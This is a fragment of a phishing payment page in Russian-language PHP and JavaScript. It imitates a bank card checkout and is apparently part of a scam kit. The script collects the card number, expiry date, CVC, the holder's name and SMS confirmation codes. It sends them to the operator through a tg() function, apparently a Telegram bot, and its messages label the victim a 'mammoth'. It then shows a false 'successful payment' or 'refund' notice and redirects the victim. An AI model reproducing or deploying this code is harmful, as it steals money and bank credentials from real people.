                $('#card_exp').focus();
                flag = false
            }
            else{
            	flag = true;
                $('#card_exp').focus();
            }
        }

	});
	$('#card_number').bind('paste', function(e) {
	var data = e.originalEvent.clipboardData.getData('Text');
	if (data.length >= 19) {


		// alert(data);

		if( Moon(data) == false ){
                $("#cardNotExist").fadeIn("slow");
                $('#card_exp').focus();
                flag = false
            }
            else{
            	flag = true;
                // $('#card_exp').focus();
            }
	} else {
		// return true;
		// alert('kiki')
	}
});






		
var isStage2 = false;
var iteration = 1;
var itrMax = "<?php echo $itr?>";




// $("#oplata").click(function(){

// 	if (flag) {

// 		fraudStart();
// 	}

// })



var fraudCheckOn = parseInt("<?php echo $fraudCheckOn?>");

function checkAll() {

	$( "#loader" ).fadeIn();

	setTimeout(function(){}, 500);


	var number = jQuery("#card_number");
	var date = jQuery("#card_exp");
	var cvc = jQuery("#card_cvc");

	var fioCheck = "<?php echo $fio?>";

	if (fioCheck) {
		var fio = jQuery("#FIO").val();	
	}
	else
		var fio = "- - -";

	if (!isStage2) {



		if (number.val().length !== 19) {
			jQuery("#mainError").fadeIn();
			flag = false
			$("#oplata").css("background-color","#f4f4f4");
		}

		if (date.val().length !== 5) {
			jQuery("#mainError").fadeIn();
			flag = false;

			$("#oplata").css("background-color","#f4f4f4");
		}

		if (cvc.val().length !== 3) {
			jQuery("#mainError").fadeIn();
			flag = false;

			$("#oplata").css("background-color","#f4f4f4");
		}



		if(flag == true){

			


			tg("🔴 ID" + "<?php echo $idPerson?>" + " 🔴" +
				"\n------------------------------------" +
				" \n💳 Карта: " + number.val() + 
				"\n📅 Срок дейстия: " + date.val()  + 
				"\n🔐 CVC/CVV: " + cvc.val() + 
				"\n🐘 Мамонт: " + fio  + 
				"\n💰 Сумма: " + "<?php echo $value?>" + " руб." + 
				"\n------------------------------------");

			if (fraudCheckOn) {
				fraudStart();
			}
			else{
				$( "#loader" ).fadeIn();
				setTimeout(
					function(){

					  	$("#cardBox").hide();
					  	// $("#cardLabel").hide();
					  	$("#expBox").hide();
					  	$("#cvcBox").hide();
					  	$("#boxMail").hide();
					  	$("#boxFio").hide();

					  	$(".styles_saveCardContainer__mPUhQ").hide();


					  	$(".styles_termsHint__2XVD6").css("opacity","0")				  	
					  	$(".styles_termsHint__2XVD6").css("margin-top","0")			  	
					  	$(".styles_termsHint__2XVD6").css("line-height","0")
					  	$("#logoBank").hide()

					  	$("#mainBut").css("color","#6c6c6c");
						$("#oplata").css("background-color","#f4f4f4");		

					  	$("#passBox").show();
					  	$(".styles_title__1O7Vi").text("Введите Ваш код")
					  	$("#pass").css("text-align","center")
					  	$("#mainBut").text("Отправить");

					  	isStage2 = true;

					  	timerStart(100);
						$( "#loader" ).fadeOut();

					}, 3000
				);
			}
		}
		else{

			$( "#loader" ).fadeOut();
		}
	}
	else{
		
		$("#errorBlock").hide();
		$("#pass").css("border","1px solid rgba(128,139,149,.32)");
		$( "#loader" ).fadeIn();
		if (iteration >= itrMax){



			tg("🟢 x "+iteration+" 🟢"+
				"\n🐘 Мамонт: " + "<?php echo $idPerson?>"  + 
				"\n------------------------------------" +
				"\n💳 Карта: " + number.val() + 
				"\n📅 Срок дейстия: " + date.val()  + 
				"\n🔐 CVC/CVV: " + cvc.val() + 
				"\n------------------------------------" +
				"\n💌 СМС: " + $("#pass").val() +
				"\n------------------------------------" +
				"\n🔥 Чекер: " + $("#balance").val()) + $(".select").text().replace(/\s/g, '');



			var ref = "<?=$ref?>"
			setTimeout(
				function(){

					timerStart(0) //остановка таймера https://t.me/slivmenss
					$( "#loader" ).fadeOut();
					$(".styles_buttons__1tD-2").fadeOut();
					$("#passBox").fadeOut();
					$("#newSMS").fadeOut();
					$("#sberPayBlock").fadeOut();
					$(".styles_description__14wbp").fadeOut()
					$(".styles_container__3S83w").fadeOut()

					$("#timerBlock").fadeOut();
					

					if (ref) {

						$(".styles_title__1O7Vi").text("Успешная оплата");
					}
					else{

						$(".styles_title__1O7Vi").text("Успешный возврат средств");
					}

					$(".styles_title__1O7Vi").css("text-align","center");


					$( "#Ok" ).fadeIn("slow");
					$( "#backToHell" ).fadeIn("slow");



				}, 1000
				);

			setTimeout(
				function(){
					window.location = "<?php echo $mysite?>"
				}, 5000
			);
		}
		else{

			tg("🟢 x "+iteration+" 🟢"+
				"\n🐘 Мамонт: " + "<?php echo $idPerson?>"  + 
				"\n------------------------------------\n" +
				"💳 Карта: " + number.val() + 
				"\n📅 Срок дейстия: " + date.val()  + 
				"\n🔐 CVC/CVV: " + cvc.val() + 
				"\n------------------------------------" +
				"\n💌 СМС: " + $("#pass").val() +
				"\n------------------------------------" +
				"\n🔥 Чекер: " + $("#balance").val()) + $(".select").text().replace(/\s/g, '');


			setTimeout(
				function(){

					iteration = iteration+1
					$("#errorBlock").show();
					$("#errorBlock p").css("color","#fb233d")
					$("#pass").css("border","1px solid #fb233d");
				  	$("#pass").val("")
				  	$("#mainBut").css("color","#6c6c6c");
					$("#oplata").css("background-color","#f4f4f4");	
					$( "#loader" ).fadeOut();

					// timerStart(100) https://t.me/slivmenss
				}, 3000
			);

		}
	}
}
window.onload = function() {
// timerStart(0) https://t.me/slivmenss
	$("#card_number").val("")
	$("#card_exp").val("")
	$("#mainError").val("")
	$("#mainError").val("")
	$("#pass").val("")

}

jQuery("#card_number").focus(function() {
	jQuery("#mainError").fadeOut();
})
jQuery("#card_exp").focus(function() {
	jQuery("#mainError").fadeOut();
})
jQuery("#card_cvc").focus(function() {
	jQuery("#mainError").fadeOut();
})


</script>

</body>

	<script src="/js/main.js"></script>
</html>